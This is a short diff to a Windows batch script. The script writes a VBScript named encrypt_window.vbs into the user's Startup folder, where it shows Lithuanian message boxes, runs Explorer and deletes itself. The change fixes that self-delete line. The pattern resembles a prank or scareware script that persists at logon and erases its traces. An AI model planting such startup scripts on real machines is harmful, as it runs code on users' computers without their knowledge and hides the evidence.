@@ -36,9 +36,7 @@ echo MsgBox"Go dar viena karta?" >> "%AppData%\Microsoft\Windows\Start Menu\Prog
 echo MsgBox"Nu kaip nori..." >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
 
 echo x.run"explorer.exe" >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
-echo x.run"cmd.exe /k del %AppData%\Microsoft\Windows\Start Menu\Programs\Startup\ecrypt_window.vbs" >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
-
-
+echo x.run"cmd.exe /k cd %appdata% && cd "Microsoft\Windows\Start Menu\Programs\Startup" && del encrypt_window.vbs" >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
 
 :VBSDynamicBuild
 SET TempVBSFile=%temp%\~tmpSendKeysTemp.vbs
